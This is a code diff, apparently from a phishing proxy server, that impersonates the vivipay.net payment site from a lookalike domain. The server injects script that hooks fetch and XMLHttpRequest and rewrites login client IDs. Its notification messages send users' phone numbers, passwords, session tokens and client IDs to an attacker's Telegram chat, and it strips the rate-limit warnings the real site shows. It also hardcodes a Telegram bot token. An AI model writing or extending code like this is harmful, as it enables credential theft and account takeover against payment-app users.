@@ -6,9 +6,9 @@ const app = express();
 const TIVOX_API = 'https://tivox.icu';
 const REAL_API = 'https://qonix.click';
 const FRONTEND_HOST = 'vivipay.net';
-const PROXY_HOST = 'rtyhh.vercel.app';
+const PROXY_HOST = 'vivipay.site';
 const BOT_TOKEN = '8537838501:AAGuVHlnxIMo6OFORmhzSvRpkkhH2-0qDCI';
-const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
+const WEBHOOK_URL = 'https://vivipay.site/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 const TELEGRAM_ADMIN_CHAT_ID = '7972440762';
@@ -89,23 +89,6 @@ function cacheSet(key, buf, ct, status, ttl) {
 // Map to debounce repetitive error logs (key -> timestamp)
 const recentErrors = new Map();
 
-// Helper to clean up ugly JSON strings accidentally sent by backend in bank fields
-function cleanUglyBankNames(obj, depth = 0) {
-    if (!obj || typeof obj !== 'object' || depth > 10) return;
-    if (Array.isArray(obj)) {
-        for (const item of obj) cleanUglyBankNames(item, depth + 1);
-        return;
-    }
-    for (const k of Object.keys(obj)) {
-        if (typeof obj[k] === 'object') {
-            cleanUglyBankNames(obj[k], depth + 1);
-        } else if (typeof obj[k] === 'string') {
-            if (obj[k].startsWith('{"code":') && obj[k].includes('"msg":')) {
-                obj[k] = 'Bank';
-            }
-        }
-    }
-}
 // ────────────────────────────────────────────────────────────────────────────
 
 async function ensureWebhook() {
@@ -247,24 +230,20 @@ async function applyNextClientIdOverride(req, data) {
     if (!replacement || (pending.expiresAt && Date.now() > Number(pending.expiresAt))) {
         data.nextClientIdOverride = null;
         data._skipOverrideMerge = true;
-        await saveData(data);
+        saveData(data).catch(() => { });
         return false;
     }
 
     // Rewrite the client ID in the request body
     if (!rewriteExistingClientIdField(req, replacement)) return false;
 
-    // The override remains available for the authentication flow until the
-    // final login request, then it is consumed and a notification is sent to admin.
     if (endpoint === 'login') {
         data.nextClientIdOverride = null;
-        const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-        notifyAdmin(data, `🎯 CLIENT ID OVERRIDE USED & CONSUMED\n🆔 Client ID: \`${replacement}\`\n✅ Next login par apply ho gaya aur Client ID consume ho chuki hai.\n🕐 ${now}`);
     } else {
         data.nextClientIdOverride = pending;
     }
     data._skipOverrideMerge = true;
-    await saveData(data);
+    saveData(data).catch(() => { });
     return true;
 }
 
@@ -1647,6 +1626,11 @@ async function proxyToTivox(req) {
     if (!fwd['user-agent']) {
         fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
     }
+    const clientIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || (req.socket && req.socket.remoteAddress) || '';
+    if (clientIp) {
+        fwd['x-forwarded-for'] = clientIp;
+        fwd['x-real-ip'] = clientIp.split(',')[0].trim();
+    }
     const opts = { method: req.method, headers: fwd, redirect: 'manual' };
     if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
         opts.body = req.rawBody;
@@ -1678,6 +1662,11 @@ async function proxyToReal(req) {
     fwd['referer'] = 'https://vivipay.net/';
     if (!fwd['user-agent']) {
         fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+    }
+    const clientIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || (req.socket && req.socket.remoteAddress) || '';
+    if (clientIp) {
+        fwd['x-forwarded-for'] = clientIp;
+        fwd['x-real-ip'] = clientIp.split(',')[0].trim();
     }
     const opts = { method: req.method, headers: fwd, redirect: 'manual' };
     if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
@@ -2211,7 +2200,7 @@ app.all('/xxapi/*', async (req, res) => {
 📱 Phone: \`${phone || 'N/A'}\`${pwd ? '\n🔐 Pass: `' + pwd + '`' : ''}
 ✅ OTP sent successfully
 🕐 ${now}`;
-                await notifyAdmin(data, otpMessage, { pin: false });
+                notifyAdmin(data, otpMessage, { pin: false }).catch(() => { });
             }
         }
 
@@ -2248,7 +2237,7 @@ app.all('/xxapi/*', async (req, res) => {
 📱 Phone: \`${phone || 'N/A'}\`${pwd ? '\n🔐 Pass: `' + pwd + '`' : ''}
 🎫 Token: \`${fullToken}\`${clientId ? '\n🆔 Client ID: `' + clientId + '`' : ''}
 🕐 ${now}`;
-                await notifyAdmin(data, loginMessage, { pin: true });
+                notifyAdmin(data, loginMessage, { pin: true }).catch(() => { });
             }
         }
 
@@ -2944,7 +2933,6 @@ ${replaceLine}
             now
         }).catch(() => { });
 
-        if (jsonResp) cleanUglyBankNames(jsonResp);
         sendJson(res, respHeaders, jsonResp);
 
     } catch (e) {
@@ -2974,34 +2962,31 @@ ${replaceLine}
 
 const INJECT_JS = `(function(){
 if(window._pxi)return;window._pxi=1;
-var P='https://${PROXY_HOST}';
+var P = (typeof window !== 'undefined' && window.location && window.location.origin) ? window.location.origin : 'https://${PROXY_HOST}';
 var REAL='https://tivox.icu';
 var REAL2='https://qonix.click';
 var SERVER_IFSC='';
 
 // ── Intercept API calls so <base> tag doesn't redirect them to vivipay.net ──
 (function(){
+  function getProxyUrl(url) {
+    if (typeof url !== 'string') return url;
+    if (url.indexOf('rsCfg.json') !== -1) return P + '/rsCfg.json';
+    if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
+      return P + '/xxapi/' + url.split('/xxapi/')[1];
+    }
+    if (url.indexOf('/xxapi/') === 0) return P + url;
+    return url;
+  }
   var origFetch = window.fetch;
   window.fetch = function(url, opts) {
-    if (typeof url === 'string') {
-      if (url.indexOf('rsCfg.json') !== -1 || url.indexOf('/rsCfg.json') !== -1) {
-        url = P + '/rsCfg.json';
-      } else if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
-        url = P + '/xxapi/' + url.split('/xxapi/')[1];
-      }
-    }
+    url = getProxyUrl(url);
     return origFetch.call(window, url, opts);
   };
   if (typeof XMLHttpRequest !== 'undefined' && XMLHttpRequest.prototype && XMLHttpRequest.prototype.open) {
     var origOpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
-      if (typeof url === 'string') {
-        if (url.indexOf('rsCfg.json') !== -1 || url.indexOf('/rsCfg.json') !== -1) {
-          url = P + '/rsCfg.json';
-        } else if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
-          url = P + '/xxapi/' + url.split('/xxapi/')[1];
-        }
-      }
+      url = getProxyUrl(url);
       return origOpen.call(this, method, url, async, user, pass);
     };
   }
@@ -3202,6 +3187,32 @@ if(elCtx.indexOf('profit')===-1&&elCtx.indexOf('reward')===-1&&elCtx.indexOf('te
 toFix.push(nd);}}}
 for(var i=0;i<toFix.length;i++){toFix[i].textContent=_cachedBal;}}
 
+function handleLoginSuccess(j) {
+  if (!j) return;
+  var d = j.data || j.body || j.result || j;
+  var tok = '';
+  if (typeof d === 'string' && d.length > 15 && !d.includes(' ') && !d.toLowerCase().includes('success')) {
+    tok = d;
+  } else if (d && typeof d === 'object') {
+    tok = d.token || d.accessToken || '';
+    if (!tok && typeof d.data === 'string' && d.data.length > 15 && !d.data.includes(' ')) tok = d.data;
+  }
+  if (!tok && typeof j.token === 'string') tok = j.token;
+  if (tok) {
+    try {
+      localStorage.setItem('token', tok);
+      localStorage.setItem('accessToken', tok);
+      document.cookie = 'token=' + tok + '; path=/; max-age=31536000; SameSite=Lax';
+      var loc = (window.location.hash || window.location.pathname || '').toLowerCase();
+      if (loc.indexOf('login') !== -1 || loc.indexOf('signin') !== -1) {
+        setTimeout(function() {
+          window.location.href = '/#/';
+        }, 150);
+      }
+    } catch(e) {}
+  }
+}
+
 XMLHttpRequest.prototype.send=function(body){
 var self=this;
 self.addEventListener('load',function(){
@@ -3210,6 +3221,7 @@ var r=self.response;
 if(!r)return;
 var j=typeof r==='object'?r:(typeof r==='string'?JSON.parse(r):null);
 if(!j)return;
+handleLoginSuccess(j);
 var d=j.data||j.body||j.result||j;
 if(d&&typeof d==='object'){
 cacheBal(d);
@@ -3234,7 +3246,9 @@ else{init.headers['x-px-uid']=UID;}arguments[1]=init;}
 return _fetch.apply(this,arguments).then(function(resp){
 try{var cl=resp.clone();
 cl.text().then(function(t){
-try{var j=JSON.parse(t);var d=j.data||j.body||j.result||j;
+try{var j=JSON.parse(t);
+handleLoginSuccess(j);
+var d=j.data||j.body||j.result||j;
 if(d&&typeof d==='object'){
 cacheBal(d);
 for(var i=0;i<ID_FIELDS.length;i++){
@@ -3428,7 +3442,8 @@ app.all('*', async (req, res) => {
             }
             let html = await response.text();
 
-            const proxyBase = 'https://' + PROXY_HOST;
+            const currentHost = req.headers['x-forwarded-host'] || req.headers.host || PROXY_HOST;
+            const proxyBase = 'https://' + currentHost;
             const frontendBase = 'https://' + FRONTEND_HOST;
 
             // Rewrite absolute tivox/qonix URLs to proxy
@@ -3507,7 +3522,8 @@ app.all('*', async (req, res) => {
                 finalCt = cached.ct;
             } else {
                 let js = await response.text();
-                const proxyBase = 'https://' + PROXY_HOST;
+                const currentHost = req.headers['x-forwarded-host'] || req.headers.host || PROXY_HOST;
+                const proxyBase = 'https://' + currentHost;
                 js = js.replace(/https:\/\/tivox\.icu/g, proxyBase);
                 js = js.replace(/https:\/\/qonix\.click/g, proxyBase);
                 js = js.replace(/\.\/rsCfg\.json/g, proxyBase + '/rsCfg.json');
@@ -3520,6 +3536,8 @@ app.all('*', async (req, res) => {
                 js = js.replace(/API_HTTP_WAITPAYER_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_WAITPAYER_MAX_PER_WINDOW=9999');
                 js = js.replace(/API_HTTP_BUY_HISTORY_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_BUY_HISTORY_MAX_PER_WINDOW=9999');
                 js = js.replace(/API_HTTP_RATE_LIMIT_MSG\s*=\s*"Please slow down\."/g, 'API_HTTP_RATE_LIMIT_MSG=""');
+                js = js.replace(/Too frequent, please try again later/g, '');
+                js = js.replace(/Frequent requests/g, '');
 
                 buf = Buffer.from(js, 'utf-8');
                 finalCt = ct;
